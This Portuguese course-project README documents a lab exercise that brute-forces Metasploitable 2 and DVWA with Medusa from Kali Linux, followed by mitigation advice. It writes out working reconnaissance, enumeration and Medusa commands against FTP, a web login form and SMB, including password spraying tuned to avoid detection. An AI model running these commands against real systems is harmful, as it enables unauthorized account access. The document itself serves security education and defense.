# 🔐 Ataques de Força Bruta com Medusa e Kali Linux

Projeto prático do módulo de Cibersegurança (DIO) — implementação e documentação de ataques de **força bruta** em ambiente controlado, usando **Kali Linux** e a ferramenta **Medusa** contra alvos vulneráveis (**Metasploitable 2** e **DVWA**), com foco em entender os ataques e propor medidas de mitigação.

> ⚠️ **Aviso legal:** todas as técnicas aqui documentadas foram estudadas e aplicadas em um **laboratório isolado e de minha propriedade**, com rede interna (host-only), sem acesso à internet. Testar força bruta em sistemas de terceiros sem autorização é **crime** (Lei 12.737/2012 — "Lei Carolina Dieckmann"). Use este material apenas para fins educacionais e em ambientes autorizados.

---

## 📑 Sumário

- [Objetivos](#-objetivos)
- [O que é força bruta](#-o-que-é-um-ataque-de-força-bruta)
- [O que é o Medusa](#-o-que-é-o-medusa)
- [Montagem do ambiente](#-montagem-do-ambiente-de-laboratório)
- [Wordlists](#-wordlists)
- [Cenário 1 — Força bruta em FTP](#-cenário-1--força-bruta-em-ftp)
- [Cenário 2 — Força bruta em formulário web (DVWA)](#-cenário-2--força-bruta-em-formulário-web-dvwa)
- [Cenário 3 — Password spraying em SMB](#-cenário-3--password-spraying-em-smb)
- [Medidas de mitigação](#-medidas-de-mitigação)
- [Conclusão e aprendizados](#-conclusão-e-aprendizados)
- [Referências](#-referências)

---

## 🎯 Objetivos

- Compreender ataques de força bruta em diferentes serviços (FTP, Web, SMB);
- Utilizar o Kali Linux e o Medusa para auditoria de segurança em ambiente controlado;
- Documentar processos técnicos de forma clara e estruturada;
- Reconhecer vulnerabilidades comuns e propor medidas de mitigação;
- Usar o GitHub como portfólio técnico.

---

## 💥 O que é um ataque de força bruta?

Força bruta é uma técnica em que o atacante tenta **adivinhar uma credencial** (geralmente a senha) testando sistematicamente muitas combinações até acertar. As variações mais comuns:

| Tipo | Como funciona |
|------|---------------|
| **Força bruta pura** | Testa todas as combinações possíveis de caracteres. Lento, mas exaustivo. |
| **Ataque de dicionário** | Testa senhas de uma lista pré-definida (wordlist). Mais rápido e realista. |
| **Password spraying** | Testa **poucas senhas comuns** contra **muitos usuários**, evitando bloqueio de conta. |
| **Credential stuffing** | Reutiliza pares usuário/senha vazados em outros serviços. |

O sucesso do ataque depende diretamente da **força da senha** e da existência (ou não) de mecanismos de defesa como bloqueio após tentativas.

---

## 🛠️ O que é o Medusa?

O **Medusa** é uma ferramenta de força bruta de login, paralela, modular e rápida, voltada para auditoria de autenticação em rede. Já vem instalada no Kali Linux. Suas principais características:

- **Paralelismo**: testa vários hosts, usuários e senhas simultaneamente;
- **Modular**: suporta diversos protocolos via módulos (FTP, SSH, HTTP, SMB, MySQL, RDP etc.);
- **Flexível**: aceita usuário/senha únicos ou listas (wordlists).

### Sintaxe básica

```bash
medusa -h <alvo> -u <usuário> -p <senha> -M <módulo>
```

### Principais flags

| Flag | Função |
|------|--------|
| `-h` | Host alvo (IP único) |
| `-H` | Arquivo com lista de hosts |
| `-u` | Usuário único |
| `-U` | Arquivo com lista de usuários |
| `-p` | Senha única |
| `-P` | Arquivo com lista de senhas (wordlist) |
| `-M` | Módulo/protocolo a ser usado (ftp, http, smbnt...) |
| `-m` | Parâmetros extras do módulo |
| `-t` | Número de tarefas (logins) paralelas |
| `-f` | Para no primeiro login válido encontrado (por host) |
| `-n` | Porta customizada |
| `-v` | Nível de verbosidade (0–6) |

Ver todos os módulos disponíveis:

```bash
medusa -d
```

---

## 🧱 Montagem do ambiente de laboratório

Ambiente isolado no **VirtualBox** com duas máquinas virtuais em **rede interna (host-only)**, sem acesso à internet.

| VM | Papel | Observações |
|----|-------|-------------|
| **Kali Linux** | Atacante | Onde o Medusa e o Nmap são executados |
| **Metasploitable 2** | Alvo | Linux propositalmente vulnerável (FTP, SMB etc.) |

> O **DVWA** (Damn Vulnerable Web Application) já vem embarcado no Metasploitable 2, acessível pelo navegador no IP do alvo.

### Passos

1. Baixar e importar as imagens do Kali e do Metasploitable 2 no VirtualBox.
2. Em **ambas** as VMs, configurar o adaptador de rede como **Rede Interna** (ou Host-Only), garantindo que fiquem na mesma sub-rede e **isoladas da internet**.
3. Subir as duas VMs e descobrir o IP do alvo.

### Reconhecimento — descobrindo o alvo e os serviços

No Kali, descobrir o IP do Metasploitable:

```bash
# Descobrir hosts ativos na rede interna
nmap -sn 192.168.56.0/24
```

Mapear portas e serviços do alvo (ex.: `192.168.56.101`):

```bash
nmap -sV 192.168.56.101
```

> 📸 *Espaço para print do resultado do Nmap — ex.: porta 21 (ftp/vsftpd), 139/445 (netbios/smb), 80 (http).*

```
# Cole aqui a saída real do seu nmap, algo como:
# PORT    STATE SERVICE     VERSION
# 21/tcp  open  ftp         vsftpd 2.3.4
# 80/tcp  open  http        Apache httpd 2.2.8
# 139/tcp open  netbios-ssn Samba smbd 3.X
# 445/tcp open  netbios-ssn Samba smbd 3.X
```

---

## 📝 Wordlists

Para o laboratório, usei wordlists simples criadas manualmente. Em cenários reais, listas como a **`rockyou.txt`** (já inclusa no Kali em `/usr/share/wordlists/`) são o padrão.

**`usuarios.txt`**
```
root
admin
msfadmin
user
service
```

**`senhas.txt`**
```
123456
password
admin
msfadmin
root
senha123
qwerty
```

> O par `msfadmin:msfadmin` é a credencial padrão do Metasploitable 2 — propositalmente fraca, ideal para demonstrar o ataque.

---

## 🧪 Cenário 1 — Força bruta em FTP

Objetivo: descobrir uma credencial válida do serviço **FTP** (porta 21) do alvo.

### Comando

```bash
medusa -h 192.168.56.101 -U usuarios.txt -P senhas.txt -M ftp -t 4 -f -v 4
```

**Explicando:**
- `-h 192.168.56.101` → alvo;
- `-U usuarios.txt` / `-P senhas.txt` → listas de usuários e senhas;
- `-M ftp` → módulo FTP;
- `-t 4` → 4 tentativas em paralelo;
- `-f` → para ao encontrar o primeiro login válido;
- `-v 4` → saída detalhada.

### Resultado esperado

Quando o par correto é testado, o Medusa marca o login como **SUCCESS**:

```
ACCOUNT FOUND: [ftp] Host: 192.168.56.101 User: msfadmin Password: msfadmin [SUCCESS]
```

> 📸 *Espaço para print do Medusa retornando SUCCESS no FTP.*

### Validando o acesso

```bash
ftp 192.168.56.101
# Nome: msfadmin
# Senha: msfadmin
```

> 📸 *Print do login FTP bem-sucedido confirmando a credencial.*

---

## 🌐 Cenário 2 — Força bruta em formulário web (DVWA)

O DVWA tem uma página de login vulnerável. Aqui o ataque é via **HTTP (formulário)**, mais complexo porque depende de entender a requisição.

### Preparação

1. Acessar o DVWA no navegador do Kali: `http://192.168.56.101/dvwa`
2. Login inicial padrão: `admin` / `password`
3. Ajustar o **nível de segurança** do DVWA para **Low** (menu *DVWA Security*).
4. Ir até o módulo **Brute Force**.

### Entendendo a requisição

A página envia os campos via `GET`/`POST`. É preciso capturar:
- o **caminho** do formulário;
- os **nomes dos campos** (`username`, `password`);
- a **mensagem de falha** (ex.: *"Username and/or password incorrect"*);
- o **cookie de sessão** (`PHPSESSID`) e o `security=low`.

O cookie pode ser copiado pelo DevTools do navegador (F12 → Application → Cookies) ou interceptado com o Burp Suite.

### Comando (módulo HTTP do Medusa)

```bash
medusa -h 192.168.56.101 -u admin -P senhas.txt -M http \
  -m DIR:/dvwa/vulnerabilities/brute/ \
  -m FORM:"username=^USER^&password=^PASS^&Login=Login" \
  -m DENY-SIGNAL:"Username and/or password incorrect" \
  -m COOKIE:"PHPSESSID=<seu_id_de_sessao>; security=low" \
  -t 2 -v 4
```

> Os placeholders `^USER^` e `^PASS^` são substituídos por cada combinação testada. A `DENY-SIGNAL` diz ao Medusa qual texto indica **falha** — todo login que não retorna essa mensagem é considerado sucesso.

> 💡 Muitos preferem o **Hydra** para formulários web pela sintaxe `http-post-form`. O desafio é flexível, então vale documentar qualquer uma das duas ferramentas.

> 📸 *Espaço para print do DVWA no nível Low, da requisição capturada e do resultado do ataque.*

---

## 📡 Cenário 3 — Password spraying em SMB

Em vez de martelar muitas senhas em um único usuário (o que dispararia bloqueios), o **password spraying** testa **uma senha comum contra vários usuários**.

### Enumeração de usuários (SMB)

Antes do ataque, enumerar usuários do alvo:

```bash
# Enumeração de usuários, grupos e compartilhamentos via SMB
enum4linux -U 192.168.56.101

# Alternativa com Nmap
nmap --script smb-enum-users -p 445 192.168.56.101
```

> 📸 *Print da lista de usuários enumerados (ex.: msfadmin, user, service...).*

Salvar os usuários encontrados em `usuarios_smb.txt`.

### Comando (uma senha, vários usuários)

```bash
medusa -h 192.168.56.101 -U usuarios_smb.txt -p "msfadmin" -M smbnt -t 1 -v 4
```

- `-p "msfadmin"` → **uma única senha** testada contra todos os usuários da lista;
- `-M smbnt` → módulo SMB;
- `-t 1` → baixa concorrência, para passar despercebido e não travar contas.

> 📸 *Espaço para print do resultado do password spraying no SMB.*

---

## 🛡️ Medidas de mitigação

As vulnerabilidades exploradas acima têm defesas bem estabelecidas:

### Contra força bruta em geral
- **Senhas fortes**: mínimo de 12+ caracteres, com letras, números e símbolos. Inviabiliza wordlists comuns.
- **Bloqueio de conta (account lockout)**: travar o acesso após N tentativas falhas.
- **Throttling / rate limiting**: atrasar progressivamente novas tentativas de login.
- **MFA (autenticação multifator)**: mesmo com a senha correta, o atacante não passa sem o segundo fator.
- **CAPTCHA**: barra ataques automatizados em formulários web.
- **Monitoramento e alertas**: detectar picos anômalos de falhas de autenticação (SIEM, fail2ban).

### Específicas por serviço
| Serviço | Mitigação |
|---------|-----------|
| **FTP** | Substituir por **SFTP/FTPS** (criptografado); desativar login anônimo; restringir por IP. |
| **Web (DVWA)** | CAPTCHA, lockout, tokens anti-CSRF, política de senhas, WAF. |
| **SMB** | Políticas de lockout do AD, desativar SMBv1, segmentação de rede, senhas fortes. |

### Ferramenta de apoio
- **`fail2ban`**: monitora logs e bane IPs automaticamente após tentativas falhas repetidas — excelente contra força bruta em FTP e SSH.

---

## 🧠 Conclusão e aprendizados

Este projeto me permitiu entender, na prática, **por que senhas fracas são tão perigosas**. Com credenciais padrão como `msfadmin:msfadmin`, o Medusa encontra o acesso em segundos. Os principais aprendizados:

- O ataque de força bruta é só o último passo: antes vêm **reconhecimento** (Nmap) e **enumeração** (enum4linux), que direcionam o ataque.
- Cada serviço exige um **módulo** e uma estratégia diferentes — um formulário web é bem mais trabalhoso que um FTP.
- O **password spraying** mostra como atacantes contornam bloqueios de conta.
- Toda vulnerabilidade demonstrada tem mitigação conhecida: **senha forte + MFA + lockout** resolvem a maioria dos casos.

A melhor defesa é entender o ataque. Conhecendo as ferramentas ofensivas, é possível construir defesas muito mais eficazes.

---

## 📚 Referências

- [Kali Linux – Site Oficial](https://www.kali.org/)
- [DVWA – Damn Vulnerable Web Application](http://www.dvwa.co.uk/)
- [Medusa – Documentação](http://www.foofus.net/jmk/medusa/medusa.html)
- [Nmap – Manual Oficial](https://nmap.org/book/)
- Slide: *Criando um Ataque Brute Force de senhas com Medusa e Kali Linux* (DIO)

---

*Projeto desenvolvido para o desafio de Cibersegurança da [DIO](https://www.dio.me/). Fins exclusivamente educacionais.*
